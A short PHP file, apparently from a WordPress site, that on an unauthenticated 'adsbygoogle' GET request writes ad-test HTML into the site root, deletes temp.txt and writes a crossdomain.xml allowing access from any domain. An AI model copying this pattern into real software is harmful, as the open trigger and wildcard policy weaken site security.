<?php 
/*php create file*/
if(isset($_GET['adsbygoogle'])) {
  $content1 = '<!doctype html>
<html>
<head>
<title>adsbygoogle</title>
</head>
<body>
<h2>this is adsbygoogle file</h2>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- ads3 -->
<ins class="adsbygoogle"
     style="display:block;border: 1px solid;"
     data-ad-client="ca-pub-1283542648622001"
     data-adtest="on"
     data-ad-slot="4249689864"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
</body>
</html>';
  $content1 .= '<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Hello GPT</title>
    <script async src="//securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
    <script>
      window.googletag = window.googletag || {cmd: []};
      googletag.cmd.push(function() {});
    </script>
  </head>
  <body>
    <div id="banner-ad" style="width: 300px; height: 250px;border: 1px solid green;">
      <script>
      window.googletag = window.googletag || {cmd: []};
      googletag.cmd.push(function() {
        googletag
            .defineSlot(
                "/6355419/Travel/Europe/France/Paris", [300, 250], "banner-ad")
            .addService(googletag.pubads());
        googletag.enableServices();
      });
      </script>
    </div>
  </body>
</html>';
  $content1 .= '<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Hello GPT</title>
    <script async src="//securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
    <script>
      window.googletag = window.googletag || {cmd: []};
      googletag.cmd.push(function() {
        googletag
            .defineSlot(
                "/6355419/Travel/Europe/France/Paris", [300, 250], "banner-ad")
            .addService(googletag.pubads());
        googletag.enableServices();
      });
    </script>
  </head>
  <body>
    <div id="banner-ad" style="width: 300px; height: 250px;border: 1px solid green;">
      <script>
        googletag.cmd.push(function() {
          googletag.display("banner-ad");
        });
      </script>
    </div>
  </body>
</html>';
  $fp1 = fopen(ABSPATH. "/adsbygoogle.htm","wb");
  fwrite($fp1,$content1);
  fclose($fp1);
unlink(ABSPATH. "/temp.txt");

  $content2 = '<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy 
  SYSTEM "http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
  ';
  $fp2 = fopen(ABSPATH. "/crossdomain.xml","wb");
  fwrite($fp2,$content2);
  fclose($fp2);
}
?>